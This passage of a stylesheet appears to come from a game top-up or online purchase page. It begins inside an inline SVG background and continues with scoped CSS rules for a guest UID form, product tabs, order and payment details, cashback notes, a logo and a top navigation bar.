2.877 1.305 7.217 2.841 3.287-.658-4.089 1.427-2.405 2.187-2.045 1.243-2.489 1.897-2.182 2.203-2.04.775-2.708 2.097-2.091 2.26-2.012.83-2.683 1.98-2.144 1.772-2.206-.978-2.857-1.396-2.864-.355-2.924-.594-2.909-1.335-2.867-1.466-2.86-.052-2.94-1.657-2.848-1.18-2.875-.38-2.92-.635-2.909-2.073-2.824-.315-2.925-1.022-2.885-1.14-2.877-1.335-2.869-.744-2.9-.83-2.896-.728-2.901-1.598-2.851-.38-2.92-.584-2.91-1.414-2.86-1.472-2.859-.887-2.892-.678-2.904-1.4-2.862.016-2.944-1.108-2.879-1.185-2.875-1.351-2.865-.82-2.895-.958-2.888-.502-2.913-1.003-2.886-1.47-2.858-.626-2.177 1.835.765 18.22 28.099 8.631 3.462 7.194-14.378-9.112-19.405-11.33-17.715-16.36 1.72s6.138 5.343 6.138 6.354l-7.553-1.109-1.809.257-.104-.307-.88-2.893-.964-2.887-.986-2.887-.615-2.907-1.38-2.864-1.202-2.874-.752-2.9-1.326-2.866-.312-2.925-1.69-2.846-.4-2.92-.801-2.897-.71-2.902-1.032-2.882-1.33-2.898-3.039-1.933-3.501-1.416-2.644-2.263-3.391-1.522-2.836-2.072-3.772-1.846.753 3.25z' fill='%23E8F953'/%3E%3Cpath d='M787 0H0v84h787V0z' fill='%23FF7F98'/%3E%3Cpath d='M117.325-35.095l8.635 2.087 9.054.406 9.921.84 1.424 1.756 10.956 1.715 15.742 3.808-1.053 1.114 17.022 2.694 10.789 3.506 16.623 1.442 9.529 5.55 13.856 6.473 11.615 6.225 7.797 2.07 14.194 4.38 4.266 3.71 7.794 2.898 4.342 3.686 6.894 2.097 2.869 3.132.077.922-.985 10.965 8.187 13.437-5.311 8.787 3.185 15.466s.165 8.715-.487 9.585c-.653.87 6.666 17.511 6.666 17.511l-2.477 3.643-6.158-2.544-4.151 3.175s.722 16.026.722 16.899c0 .873 1.383 19.413 3.165 20.576 1.782 1.163-6.936 10.89-7.589 11.763-.654.872-6.399 17.829-6.399 17.829l-7.851 1.071-10.47 8.641 1.308 3.669 21.886-5.368a56.836 56.836 0 01-5.635 3.517c-13.232 7.254-53.179 6.967-69.339 13.125-16.04 6.105-33.338 11.595-51.689 16.406-18.281 4.788-37.593 8.886-57.416 12.175-20 3.32-40.69 5.849-61.496 7.514-43.276 3.466-86.622 3.251-128.833-.641-36.329-3.35-69.932-9.248-100.122-17.569.688.438 1.378.874 2.07 1.307 12.13 7.552 26.022 14.529 41.303 20.739 15.36 6.248 32.284 11.775 50.474 16.484 18.434 4.76 38.077 8.633 58.56 11.548 20.984 2.99 43.021 4.988 65.507 5.943 22.485.954 45.382.864 68.081-.269a738.781 738.781 0 0065.954-6.264c21.24-2.997 42.156-6.934 62.172-11.702 19.815-4.721 38.926-10.296 56.79-16.574 17.863-6.279 34.641-13.306 49.865-20.893 15.439-7.705 29.271-15.958 41.344-24.665 12.322-8.892 22.776-18.22 31.243-27.879 8.661-9.901 15.191-20.11 19.509-30.504 4.301-10.365 6.338-20.82 6.049-31.078-.283-10.002-2.773-19.932-7.411-29.52-4.558-9.411-11.208-18.581-19.795-27.261-8.497-8.593-18.954-16.78-31.559-25.565l-9.64-16.2-25.89-9.205-20.531-3.89-15.735-4.735-11.403-2.618-13.08-7.175-19.822-2.155-33.761-1.566c-20.985-2.987-43.023-4.985-65.501-5.939a737.196 737.196 0 00-45.85-.507zm252.581 98.964l-1.102 12.073 4.784 8.048-17.33 18.187-3.592 11.684-4.589 3.399.182-21.791 3.489-3.2 2.621-12.257 3.935-3.686 2.904-9.437-1.387-9.558.331-3.164 9.754 9.702zM299.784-9.284l1.878 5.684 7.259 4.996s2.064 1.537 2.56 2.16c.496.624 2.208 2.06 2.896 2.573.688.513-.53 2.105-.53 2.105l1.713 1.439-5.697-1.587-3.97-2.874s.318-1.679-.564-2.085c-.882-.406-8.697-2.843-8.697-2.843s-5.084-4.82-6.151-5.116c-1.066-.296-10.293-3.458-10.293-3.458l-.268-3.782 6.255-6.872 13.609 9.66z' fill='%23E8F953'/%3E%3Cpath d='M-11.365-47.43c-20.798 1.665-58.083 14.39-78.084 17.711-19.822 3.289-39.135 7.387-57.416 12.175-18.35 4.812-35.646 10.303-51.685 16.408-16.173 6.162-31.001 12.924-44.305 20.205-27.535 15.086-47.736 31.95-60.045 50.128-12.308 18.178-15.996 36.562-10.939 54.653 2.436 8.698 6.915 17.282 13.334 25.519 6.341 8.145 14.609 16 24.68 23.447 10.008 7.39 21.784 14.328 35.144 20.707 13.428 6.406 28.402 12.204 44.681 17.302a431.34 431.34 0 0014.38 4.223c-11.25-7.186-21.006-14.924-29.014-23.024-8.58-8.68-15.241-17.851-19.788-27.261-4.637-9.589-7.135-19.521-7.417-29.521a66.354 66.354 0 01.047-5.064c2.718 3.245 5.774 6.427 9.151 9.522 7.246 6.632 16.025 12.925 26.084 18.703 20.943 12.02 47.11 21.742 77.782 28.885 30.672 7.143 64.021 11.297 99.132 12.331 16.876.5 34.078.258 51.134-.713a587.461 587.461 0 0050.199-5.021 541.258 541.258 0 0028.387-4.856l1.101 1.94 46.393-3.689 15.564.206 16.833-4.349 26.902-16.055 14.833-12.027 17.504-8.367 16.155-10.754 11.841-18.154 5.652-12.813-3.537-9.263.096-1.3a.01.01 0 00.004-.001l.002-.003-.002-.002a.01.01 0 00-.004-.002 50.21 50.21 0 001.528-4.214l-1.101-1.703v-.002l.481-6.697.365-4.837 2.735-3.582-1.803-3.612-2.27-2.419-1.845-5.052-.456.273-1.028-7.91-4.521-6.017-2.476-3.675.853-2.392-5.064-3.997-2.221-1.748-2.209-3.243.531-4.483-9.413-3.634.392-5.664-9.995-3.972-5.118-5.82-3.344-4.354-8.023-.933-4.066-2.335-9.804-3.193-.805-2.158-5.986-2.146-8.594-4.115-6.446-3.582-15.534-4.895-5.752-2.775-15.556-2.799c-9.564-2.229-16.244-2.01-26.296-3.65-3.689-.604-10.542-3.318-14.291-3.84a517.542 517.542 0 00-24.15-2.778 751.796 751.796 0 0135.193-1.537l-2.201-.531-9.901-.905-1.576.67-34.436.464-18.254-2.16-62.322-9.874zm-137.358 78.222c.516-2.122 1.341-4.23 2.47-6.31a333.534 333.534 0 016.571-3.367c15.215-7.587 31.989-14.617 49.857-20.896 17.868-6.278 36.974-11.852 56.794-16.571a574.648 574.648 0 018.373-1.931c2.401-.032 4.81-.035 7.217-.004 12.522.16 43.498 11.12 47.481 13.51 5.394.017 19.582.38 21.233.77l16.451 1.903L84.589 8.598l.097 8.053 4.704 3.91L86.09 24.4l.485 9.263-3.83 6.567-.199 3.19-.502 6.038-12.984 7.493c-3.714 3.062-5.517 6.186-5.517 6.186L51.245 68.43l-4.102 2.976s-27.906 5.811-41.777 8.03c-15.454 2.471-31.36 3.623-47.275 3.42-15.384-.197-30.15-1.641-43.882-4.292-13.733-2.65-25.726-6.374-35.661-11.066-10.271-4.857-17.887-10.547-22.616-16.918-4.728-6.371-6.3-13.024-4.656-19.787zM76.353 86.35l14.14-4.382 15.061-8.761-6.44 15.356-13.987 7.301-24.551 7.408-20.015 11.372-11.602-11.798 20.256-7.094 10.922-1.423 5.14.632 11.076-8.61zm170.088-9.176l.584 2.181-4.692 6.23-.289 4.81-15.115 7.524-5.835 5.727-22.532 7.976-7.507-1.276-.048-.247-.31-1.644 4.788-1.017 12.307-2.604 5.049-3.297 3.84-4.391 11.325-4.985 5.539-6.149 3.282-1.473 4.258-4.185.008-.002.447-.441 2.553-5.2 1.247-1.625 1.101 4.088zM63.752-31.994c18.122 2.468 40.628 14.717 40.628 14.717 8.284 2.393 17.387 3.35 24.888 6.29l11.421 8.968 18.302 12.027 12.136 4.336 5.436 5.565 13.967 17.833 5.889 12.586-3.714 6.1 2.51 5.443-6.969 13.257-4.404 1.702-2.339-2.317-4.575 2.042-1.499 3.528-.715.276-19.144 25.872-19.286 5.498-19.843 14.396-22.56 4.688-17.96 8.463-26.242 2.935-10.673 12.205 18.529-.403c-24.425 5.075-50.171 8.221-76.647 9.335-28.8 1.215-56.982-.02-83.778-3.672-27.728-3.781-52.758-10.002-74.388-18.49-21.63-8.489-38.557-18.732-50.309-30.443a79.283 79.283 0 01-4.768-5.168c.183-.473.371-.943.565-1.413 4.325-10.394 10.857-20.602 19.518-30.503 6.014-6.868 13.041-13.57 21.041-20.07-.757 8.266 1.796 16.387 7.603 24.203 6.928 9.326 18.088 17.667 33.176 24.793 14.559 6.878 32.139 12.334 52.243 16.216 20.104 3.881 41.73 5.994 64.283 6.281 23.367.301 46.677-1.384 69.3-5.002a364.841 364.841 0 0021.961-4.192 313.407 313.407 0 0015.055-3.756c8.504-2.352 9.77 2.529 17.393-.397 3.936-1.514 10.666-5.615 14.284-7.245 6.006-2.711 20.468-13.602 20.468-13.602l8.911-9.756 11.682-7.11 4.637-10.817s7.789-6.226 8.718-10.031l1.328-4.452-3.323-2.601-.262-8.503-2.999-6.92-4.122-2.825.076-6.407-5.415-1.681-1.41-3.173-3.117-1.427-2.595-.583s1.232 3.443 1.143 3.695c-.09.252-1.479 4.419-1.479 4.419l-3.309 6.754-2.691-1.183 1.892-3.985-2.112-2.805 3.364-4.562.145-3.326-1.947-1.806-2.051-2.836-3.33-.8-.82-3.223-2.498-1.145-1.211-1.653-6.922-1.58-7.314-2.352-2.643-5.014-24.866-5.896-13.74-4.15a318.606 318.606 0 00-10.691-1.874c-17.008-2.69-34.986-4.17-53.598-4.408-.943-.012-1.878-.02-2.82-.026a695.506 695.506 0 0129.992-4.898A728.536 728.536 0 0163.34-32.05c.14.016.27.036.408.054l.004.001zM425.835-26.619c-13.898 15.563-32.086 50.51-44.263 66.72-12.07 16.065-23.213 32.363-33.133 48.448-9.953 16.149-18.675 32.062-26.063 47.552-7.447 15.624-13.506 30.753-18.104 45.204-9.505 29.924-12.476 56.071-8.832 77.719 3.645 21.648 13.669 37.494 29.818 47.091 7.766 4.611 16.933 7.729 27.264 9.256 10.21 1.515 21.614 1.489 34.041-.075 12.343-1.564 25.652-4.674 39.721-9.282 14.137-4.637 28.973-10.78 44.27-18.33a432.704 432.704 0 0013.318-6.873c-13.099 2.568-25.5 3.705-36.886 3.374-12.199-.356-23.349-2.392-33.136-6.061-9.974-3.735-18.638-9.196-25.746-16.236a66.968 66.968 0 01-3.461-3.696c4.206.471 8.613.663 13.193.57 9.821-.203 20.517-1.711 31.782-4.476 23.451-5.763 49.092-16.795 76.214-32.802 27.121-16.008 54.115-36.026 80.23-59.518a594.19 594.19 0 0036.501-35.818 587.62 587.62 0 0032.85-38.288 541.401 541.401 0 0017.184-23.11l2.136.643 31.016-34.698L717.151 20.1l9.175-14.768 8.378-30.188 2.428-18.942 6.887-18.137 4.263-18.933-3.967-21.308-4.757-13.171-8.954-4.26-.827-1.007.002-.004-.001-.003h-.003l-.004.001a49.999 49.999 0 00-1.804-4.103l-1.972-.472-.002-.002-4.275-5.176-3.075-3.752-.495-4.479-3.797-1.369-3.313-.182-4.822-2.382-.142.512-6.204-5.012-7.425-1.233-4.329-.948-1.034-2.32-6.423.605-2.814.268-3.836-.821-2.711-3.61-9.319 3.87-3.626-4.369-9.973 4.027-7.722-.676-5.424-.841-6.449 4.863-4.553 1.118-9.297 4.458-2.072-1.005-5.813 2.581-9.058 2.955-7.136 1.859-14.617 7.183-6.078 1.963-13.186 8.715c-8.457 4.99-13.139 9.761-21.544 15.514-3.085 2.11-9.917 4.877-12.99 7.088a517.63 517.63 0 00-19.389 14.662 750.838 750.838 0 0124.399-25.408l-1.959 1.136-7.787 6.18-.678 1.573-24.592 24.11-14.697 11.038-51.903 35.883zM380.465 124.8c-1.092-1.892-1.95-3.986-2.569-6.271a336.643 336.643 0 012.429-6.972c5.77-15.993 13.052-32.659 21.643-49.537 8.592-16.878 18.566-34.1 29.647-51.198a566.96 566.96 0 014.725-7.177 271.198 271.198 0 015.219-4.985c9.169-8.53 39.144-21.986 43.676-23.007 3.914-3.711 14.429-13.244 15.893-14.1l13.215-9.982 19.589-3.9 5.63 5.759 6.103-.42.262 5.057 6.746 6.367 1.763 7.393 2.059 2.447 3.804 4.714-4.22 14.384c-.573 4.78.279 8.285.279 8.285l-5.24 12.318-.914 4.985s-16.177 23.47-24.679 34.651c-9.474 12.457-20.186 24.271-31.84 35.112-11.266 10.479-22.945 19.627-34.71 27.191-11.765 7.563-23.012 13.149-33.439 16.613-10.783 3.577-20.221 4.719-28.041 3.374-7.82-1.345-13.55-5.073-17.03-11.101zM581.652 9.606l7.205-12.932 4.848-16.736 5.942 15.555-5.079 14.939-12.647 22.308-6.628 22.045-16.539-.525 9.757-19.117 6.918-8.57 4.155-3.09 2.068-13.877zm116.716-124.063l1.928 1.174.906 7.746 3.113 3.68-5.742 15.878-.266 8.172-10.796 21.326-6.311 4.259-.205-.145-1.359-.976 2.761-4.04 7.106-10.381 1.376-5.872-.253-5.827 4.752-11.425-.238-8.272 1.357-3.332.192-5.967.003-.007.02-.628-1.744-5.524-.219-2.037 3.619 2.198zM490.834-67.311c14.815-10.725 39.553-17.401 39.553-17.401 7.645-3.988 14.891-9.58 22.348-12.631l14.453-1.398 21.544-3.934 11.773-5.242 7.775.273 22.416 3.259 12.95 5.04 1.523 6.977 5.575 2.205 4.11 14.402-2.011 4.272-3.292-.061-1.9 4.635 1.352 3.587-.328.693 4.012 31.934-10.156 17.292-4.417 24.114-13.085 18.968-7.15 18.52-16.959 20.24.705 16.199 13.126-13.084c-14.166 20.534-30.62 40.585-49.005 59.669-19.997 20.763-41.238 39.325-63.144 55.182-22.67 16.407-45.073 29.187-66.582 37.979-21.508 8.792-40.826 13.067-57.413 12.708a78.821 78.821 0 01-7.017-.447 72.893 72.893 0 01-.567-1.412c-4.046-10.505-6.368-22.4-6.938-35.543-.39-9.12.066-18.821 1.367-29.044 5.159 6.502 12.612 10.614 22.208 12.26 11.452 1.964 25.284.293 41.119-4.968 15.281-5.075 31.766-13.264 48.989-24.336 17.224-11.071 34.328-24.472 50.843-39.835 17.113-15.914 32.813-33.227 46.681-51.461a365.04 365.04 0 0012.994-18.195 315.166 315.166 0 008.299-13.11c4.529-7.573 8.814-4.916 12.309-12.296 1.802-3.813 3.84-11.426 5.332-15.102 2.473-6.109 5.417-23.972 5.417-23.972l-.29-13.21 3.544-13.208-4.113-11.027s1.336-9.882-.619-13.276l-2.113-4.137-4.2.412-6.059-5.97-6.947-2.937-4.932.802-4.368-4.687-5.079 2.522-3.21-1.322-3.24 1.12-2.28 1.37s3.268 1.64 3.377 1.883c.11.245 1.981 4.218 1.981 4.218l2.269 7.171-2.763 1.002-1.382-4.19-3.465-.57-.716-5.623-2.191-2.506-2.656.038-3.441-.637-2.962 1.72-2.818-1.765-2.598.896-2.016-.36-6.099 3.636-6.915 3.348-5.374-1.803-22.06 12.901-12.805 6.484a317.668 317.668 0 00-9.028 6.025c-14.162 9.797-28.19 21.137-41.819 33.814-.69.642-1.373 1.282-2.059 1.928a696.192 696.192 0 0118.317-24.25 729.19 729.19 0 0121.984-26.503c.112-.085.221-.16.333-.243l.003-.002z' fill='%23E8F953'/%3E%3C/g%3E%3Cdefs%3E%3CclipPath id='clip0_1265_191915'%3E%3Cpath d='M0 22V6a6 6 0 016-6h775a6 6 0 016 6v16H0z' fill='%23fff'/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E");
    background-size: cover;
    background-position: 50%;
    background-repeat: no-repeat
}

.get-guest-uid__badge[data-v-1e67f328] {
    position: absolute;
    font-family: NotoSans-SemiBold, sans-serif;
    color: var(--color-green-5);
    font-size: .75rem;
    line-height: 18px;
    padding: 4px 6px;
    transform: translateY(-50%);
    border-radius: 8px 8px 8px 0;
    background: linear-gradient(93deg, #a7ffb6, #feecac);
    box-shadow: inset 0 0 5px 0 rgba(102, 187, 80, .25)
}

[dir=rtl] .get-guest-uid__badge[data-v-1e67f328] {
    border-radius: 8px 8px 0 8px
}

.get-guest-uid__header[data-v-1e67f328] {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 15px
}

.get-guest-uid__header-message[data-v-1e67f328] {
    display: inline-flex;
    flex-direction: column
}

.get-guest-uid__header-message .title[data-v-1e67f328] {
    color: var(--color-tertiary-1);
    font-size: .75rem;
    font-family: NotoSans-SemiBold, sans-serif;
    margin-bottom: 5px
}

.get-guest-uid__header-message .desc[data-v-1e67f328] {
    display: flex;
    gap: 5px;
    align-items: center;
    color: var(--color-text-dark);
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif
}

.get-guest-uid__header-message .desc .icon[data-v-1e67f328] {
    display: inline-flex
}

.get-guest-uid__header-icon>svg[data-v-1e67f328] {
    width: 32px;
    height: 32px
}

.get-guest-uid__uid[data-v-1e67f328] {
    display: flex;
    position: relative
}

.get-guest-uid__uid .form-group[data-v-1e67f328] {
    width: 100%;
    margin-top: 7px
}

.get-guest-uid__uid-form[data-v-1e67f328] {
    flex: 1
}

.get-guest-uid__uid-action[data-v-1e67f328] {
    position: absolute;
    top: 17px
}

[dir=ltr] .get-guest-uid__uid-action[data-v-1e67f328] {
    right: 6px
}

[dir=rtl] .get-guest-uid__uid-action[data-v-1e67f328] {
    left: 6px
}

.get-guest-uid__switch[data-v-1e67f328] {
    width: -webkit-max-content;
    width: max-content;
    color: var(--color-primary-main);
    font-size: .75rem;
    font-family: NotoSans-SemiBold, sans-serif;
    cursor: pointer
}

[dir=ltr] .get-guest-uid.with-embed-action[data-v-1e67f328] .form-group input {
    padding-right: 70px
}

[dir=rtl] .get-guest-uid.with-embed-action[data-v-1e67f328] .form-group input {
    padding-left: 70px
}

@media screen and (min-width:768px) {
    [dir=ltr] .get-guest-uid.with-embed-action[data-v-1e67f328] .form-group input {
        padding-right: 110px
    }

    [dir=rtl] .get-guest-uid.with-embed-action[data-v-1e67f328] .form-group input {
        padding-left: 110px
    }
}

.get-guest-uid[data-v-1e67f328] .get-guest-uid__uid-input,
.get-guest-uid[data-v-1e67f328] .input-field--error {
    font-family: NotoSans-Regular, sans-serif
}

@keyframes fadeIn-data-v-79ff3352 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-79ff3352 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-79ff3352]:export {
    breakpointLg: 992px
}

.product-nav[data-v-79ff3352] {
    display: flex;
    align-items: center;
    background: var(--color-light-6);
    border-radius: 39px;
    padding: 0;
    margin: 25px auto;
    max-width: 100%;
    width: -webkit-fit-content;
    width: -moz-fit-content;
    width: fit-content;
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: .875rem
}

.product-nav__pills[data-v-79ff3352] {
    list-style-type: none;
    padding: 8px 12px;
    text-align: center;
    color: var(--color-light-main);
    cursor: pointer;
    min-width: 125px;
    display: inline-flex;
    justify-content: center
}

.product-nav__pills.active[data-v-79ff3352] {
    border-radius: 39px;
    background: var(--color-primary-main);
    margin: 4px;
    color: #fff;
    cursor: default
}

.product-nav__highlight[data-v-79ff3352] {
    background: var(--color-tertiary-1);
    width: 12px;
    height: 12px;
    border-radius: 8px;
    border: 1px solid var(--color-light-main);
    margin: 0 4px
}

@keyframes fadeIn-data-v-16bec177 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-16bec177 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-16bec177]:export {
    breakpointLg: 992px
}

.product__loader[data-v-16bec177] {
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center
}

.product__blocking[data-v-16bec177] {
    display: flex;
    max-width: 1280px;
    margin: 0 auto;
    flex-direction: column
}

.product__info[data-v-16bec177] {
    width: 100%;
    margin-top: 5px
}

.product__purchase-form[data-v-16bec177] {
    width: 100%;
    max-width: none;
    margin: 0 auto;
    padding: 0 15px;
    display: block
}

.product__tab-pane[data-v-16bec177] {
    display: none
}

.product__tab-pane.active[data-v-16bec177] {
    display: block
}

.product__tab-pane__section-footnote[data-v-16bec177] {
    display: flex;
    align-items: center;
    justify-content: flex-end;
    color: var(--color-light-main);
    margin-top: -16px;
    padding-bottom: 16px
}

.product__tab-pane__section-footnote img[data-v-16bec177] {
    margin-left: 8px;
    height: 1.5rem
}

.order-info__header-close[data-v-16bec177] {
    padding: 0;
    min-width: 20px
}

.order-info__subheader[data-v-16bec177] {
    margin: 0 0 10px;
    font-size: .875rem;
    font-family: NotoSans-Regular, sans-serif;
    color: var(--color-dark-5)
}

.order-info__sku-detail[data-v-16bec177] {
    min-height: 48px;
    padding: 8px;
    display: flex;
    align-items: center;
    gap: 8px;
    border-radius: 8px;
    background-color: #f6f5fc
}

.order-info__sku-detail__image[data-v-16bec177] {
    max-height: 52px
}

.order-info__sku-detail__message[data-v-16bec177] {
    font-size: .875rem;
    font-family: NotoSans-Bold, sans-serif;
    flex: 1
}

.order-info__row[data-v-16bec177] {
    display: flex;
    padding: 8px 0;
    font-family: NotoSans-Regular, sans-serif
}

.order-info__row .title[data-v-16bec177] {
    font-family: NotoSans-Bold, sans-serif;
    color: var(--color-dark-main);
    align-self: center
}

.order-info__row .first-col[data-v-16bec177] {
    color: var(--color-light-6);
    width: 40%;
    align-self: center
}

.order-info__row .second-col[data-v-16bec177] {
    width: 59%;
    color: var(--color-dark-main);
    word-break: break-all
}

[dir=ltr] .order-info__row .second-col[data-v-16bec177] {
    padding-left: 20px
}

[dir=rtl] .order-info__row .second-col[data-v-16bec177] {
    padding-right: 20px
}

.order-info__row .second-col.success[data-v-16bec177] {
    color: #08ad36
}

.order-info__row .second-col.fail[data-v-16bec177] {
    color: #ee3131
}

.order-info__row .second-col>.section-name[data-v-16bec177] {
    align-self: center;
    padding-top: 10px
}

.order-info__row .second-col__dropdown[data-v-16bec177] {
    width: 100%
}

[data-v-16bec177] .order-info__row .second-col__link {
    color: var(--color-primary-main)
}

.order-info__row .second-col[data-v-16bec177] span.currency-symbol {
    font-size: 1rem
}

.order-info__quick-topup-pp-integration-info[data-v-16bec177] {
    padding: 10px;
    background-color: var(--color-light-main);
    border-radius: 8px;
    border: 1px solid var(--color-light-4);
    margin-top: 10px;
    display: flex
}

[dir=ltr] .order-info__quick-topup-pp-integration-info .icon[data-v-16bec177] {
    margin-right: 10px
}

[dir=rtl] .order-info__quick-topup-pp-integration-info .icon[data-v-16bec177] {
    margin-left: 10px
}

.order-info__quick-topup-pp-integration-info .info-text[data-v-16bec177] {
    max-width: 400px
}

.order-info__total-payment__row[data-v-16bec177] {
    display: flex;
    flex-direction: column;
    padding-top: 15px
}

.order-info__total-payment__row .total-payment-label[data-v-16bec177] {
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif;
    color: var(--color-dark-main);
    width: 50%
}

.order-info__total-payment__row .total-payment-value[data-v-16bec177] {
    font-size: 1.5rem;
    font-family: NotoSans-Bold, sans-serif;
    color: var(--color-tertiary-main);
    width: 50%
}

.order-info__total-payment__row .total-payment-value[data-v-16bec177] span.currency-symbol {
    font-size: 1rem;
    color: var(--color-dark-main)
}

.order-info__total-payment .dashed-line[data-v-16bec177] {
    border: 1px dashed var(--color-light-main);
    margin-top: 30px
}

.order-info__cashback[data-v-16bec177] {
    display: flex;
    padding-top: 20px
}

.order-info__cashback-label[data-v-16bec177] {
    margin: auto 0
}

.order-info__cashback-description[data-v-16bec177] {
    font-size: .75rem;
    font-family: NotoSans-SemiBold, sans-serif;
    color: var(--color-light-4);
    width: 75%
}

[dir=ltr] .order-info__cashback-description[data-v-16bec177] {
    margin-left: 10px
}

[dir=rtl] .order-info__cashback-description[data-v-16bec177] {
    margin-right: 10px
}

.order-info__recurring-info[data-v-16bec177] {
    border: 1px solid var(--color-light-4);
    border-radius: 8px;
    margin-top: 10px
}

.order-info__recurring-info-header[data-v-16bec177] {
    display: flex;
    align-items: center
}

[dir=ltr] .order-info__recurring-info-header .icon-left[data-v-16bec177] {
    margin-right: 10px
}

[dir=rtl] .order-info__recurring-info-header .icon-left[data-v-16bec177] {
    margin-left: 10px
}

.order-info__recurring-info-header .icon-right[data-v-16bec177] {
    cursor: pointer
}

[dir=ltr] .order-info__recurring-info-header .icon-right[data-v-16bec177] {
    margin-left: auto
}

[dir=rtl] .order-info__recurring-info-header .icon-right[data-v-16bec177] {
    margin-right: auto
}

[dir=ltr] .order-info__recurring-info-header .icon-right[data-v-16bec177] {
    margin-right: 5px
}

[dir=rtl] .order-info__recurring-info-header .icon-right[data-v-16bec177] {
    margin-left: 5px
}

.order-info__recurring-info-header .title[data-v-16bec177] {
    font-size: .875rem;
    line-height: 20px;
    font-family: NotoSans-Bold, sans-serif;
    color: var(--color-dark-main)
}

.order-info__recurring-info-description[data-v-16bec177] {
    font-size: .75rem;
    color: var(--color-dark-5);
    padding: 5px 15px
}

.order-info__recurring-info-subscribe[data-v-16bec177] {
    display: flex;
    align-items: center;
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif;
    color: var(--color-primary-main);
    padding: 5px 15px 12px;
    cursor: pointer;
    width: -webkit-fit-content;
    width: -moz-fit-content;
    width: fit-content
}

.order-info__recurring-info-subscribe .icon[data-v-16bec177] {
    display: inline-flex;
    padding-top: 2px
}

[dir=ltr] .order-info__recurring-info-subscribe .icon[data-v-16bec177] {
    margin-left: 5px
}

[dir=rtl] .order-info__recurring-info-subscribe .icon[data-v-16bec177] {
    margin-right: 5px
}

[dir=ltr] .order-info__recurring-info-subscribe .icon[data-v-16bec177] {
    transform: unset
}

[dir=rtl] .order-info__recurring-info-subscribe .icon[data-v-16bec177] {
    transform: rotate(-180deg)
}

.order-info__cashback-info[data-v-16bec177] {
    display: flex;
    align-items: center;
    margin-top: 8px;
    font-size: .75rem;
    color: var(--color-dark-main);
    font-family: NotoSans-SemiBold, sans-serif;
    border-radius: 100px;
    background: linear-gradient(342deg, var(--color-green-3) 16.91%, var(--color-green-3) 92.95%);
    line-height: 18px;
    padding: 7px;
    width: -webkit-fit-content;
    width: -moz-fit-content;
    width: fit-content
}

.order-info__cashback-info .icon[data-v-16bec177] {
    width: 18px;
    height: 18px
}

[dir=ltr] .order-info__cashback-info .icon[data-v-16bec177] {
    margin-right: 5px
}

[dir=rtl] .order-info__cashback-info .icon[data-v-16bec177] {
    margin-left: 5px
}

@media screen and (min-width:768px) {
    .product__blocking[data-v-16bec177] {
        flex-direction: row
    }

    .product__info[data-v-16bec177] {
        width: 36%;
        margin-top: 25px;
        padding: 0 15px
    }

    .product__purchase-form[data-v-16bec177] {
        width: 64%
    }

    .order-info__total-payment__row[data-v-16bec177] {
        flex-direction: row
    }

    .order-info__total-payment__row .total-payment-label[data-v-16bec177],
    .order-info__total-payment__row .total-payment-value[data-v-16bec177] {
        align-self: center;
        width: 50%
    }
}

.spinner[data-v-16bec177] {
    position: absolute;
    top: -25px;
    bottom: 0;
    left: 0;
    right: 0;
    margin: auto
}

button[data-v-16bec177] {
    min-width: 40px
}


        .logo__container {
            display: inline-flex;
            flex-direction: row;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            height: 30px;
            overflow-y: hidden;
            width: 100%
        }

        .logo__container--with-link,
        .logo__container--without-link {
            display: inline-flex;
            align-items: center;
            max-width: 100%
        }

        .logo__container--without-link.hide {
            display: none
        }

        .logo__container--without-link .logo__image {
            cursor: auto
        }

        .logo__link {
            display: inline-flex;
            text-decoration: none
        }

        .logo__image {
            display: inline-flex;
            cursor: pointer
        }

        .logo__powered-by {
            display: inline-flex;
            align-items: center
        }

        .logo__text {
            font-size: .75rem;
            color: #333;
            padding: 0 3px
        }

        .logo__tagline,
        .pane-container-wrapper .logo__tagline {
            display: none
        }

        .pane-container-wrapper .logo__container {
            padding: 0
        }

        .logo__copy {
            font-family: OTT-Bold, sans-serif;
            font-size: 13px;
            line-height: 24px;
            padding: 0 0 0 4px;
            -webkit-font-smoothing: antialiased;
            letter-spacing: .5px;
            color: var(--color-dark-main)
        }

        @media screen and (min-width:768px) {

            .logo__container,
            .logo__tagline {
                overflow: hidden
            }

            .logo__tagline {
                font-family: NotoSans-Light, sans-serif;
                font-style: italic;
                color: var(--color-light-main);
                margin: 0;
                line-height: 26px;
                text-overflow: ellipsis;
                white-space: nowrap;
                -webkit-font-smoothing: subpixel-antialiased !important;
                -moz-osx-font-smoothing: grayscale !important;
                display: inline-block
            }

            [dir=ltr] .logo__tagline {
                padding-left: 10px
            }

            [dir=rtl] .logo__tagline {
                padding-right: 10px
            }
        }

        @keyframes fadeIn-data-v-530f4f9e {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes placeHolderShimmer-data-v-530f4f9e {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 51%
            }

            to {
                background-position: 0 50%
            }
        }

        [data-v-530f4f9e]:export {
            breakpointLg: 992px
        }

        .top-navbar[data-v-530f4f9e] {
            box-shadow: 0 4px 22px var(--box-shadow-primary);
            background-color: var(--color-dark-4)
        }

        .top-navbar__container[data-v-530f4f9e] {
            width: 100%;
            position: relative;
            max-width: 1280px;
            padding: 0 10px;
            margin: auto auto 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-height: 56px;
            overflow: visible;
            transition: margin-bottom .3s
        }

        .top-navbar__sign-up[data-v-530f4f9e] {
            display: flex;
            justify-content: flex-end
        }

        [dir=ltr] .top-navbar__sign-up[data-v-530f4f9e] {
            margin-left: 3px
        }

        [dir=rtl] .top-navbar__sign-up[data-v-530f4f9e] {
            margin-right: 3px
        }

        .top-navbar__sign-up button[data-v-530f4f9e] {
            max-width: 110px;
            text-overflow: ellipsis;
